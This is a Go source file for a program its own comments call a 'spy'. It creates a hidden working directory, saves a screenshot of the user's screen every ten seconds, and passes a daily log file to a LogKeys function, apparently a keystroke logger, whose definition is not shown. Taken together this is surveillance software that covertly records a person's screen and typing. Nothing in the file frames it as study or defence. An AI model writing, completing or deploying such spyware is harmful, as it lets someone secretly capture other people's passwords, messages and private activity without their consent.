package main

import (
	"image/png"
	"os"
	"time"

	"github.com/vova616/screenshot"
)

const (
	// Home directory for spy
	spyhome = "/home/slava/spy/"
)

// Get current date format as DD.MM.YYYY
func getCurrentDate() string {
	return time.Now().Format("02.01.2006")
}

// Get current time format as HH:MM:SS
func getCurrentTime() string {
	return time.Now().Local().Format("15:04:05")
}

// Capture screenshot every {seconds}
func intervalScreenShot(seconds int) {
	for {
		screenName := spyhome + "screen_" + getCurrentDate() + "_" + getCurrentTime() + ".png"
		makeScreenShot(screenName)
		time.Sleep(time.Duration(seconds) * time.Second)
	}
}

// Make screen shot ans save it as
func makeScreenShot(filename string) {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

// Append string to file.
func appendIntoFile(filename, content string) {
	// Chech file exists.
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		// Create file for loggin.
		f, err := os.Create(filename)
		if err != nil {
			panic(err)
		}
		defer f.Close()
	}

	file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND, 0777)

	if err != nil {
		panic(err)
	}

	if _, err := file.WriteString(content); err != nil {
		panic(err)
	}

	defer file.Close()
}

func main() {
	// Create home directory for spy
	if _, err := os.Stat(spyhome); os.IsNotExist(err) {
		os.Mkdir(spyhome, 0777)
	}

	// Set screen shot interval
	go intervalScreenShot(10)

	filename := spyhome + "file_" + getCurrentDate() + ".txt"
	LogKeys(filename)
	os.Exit(0)
}
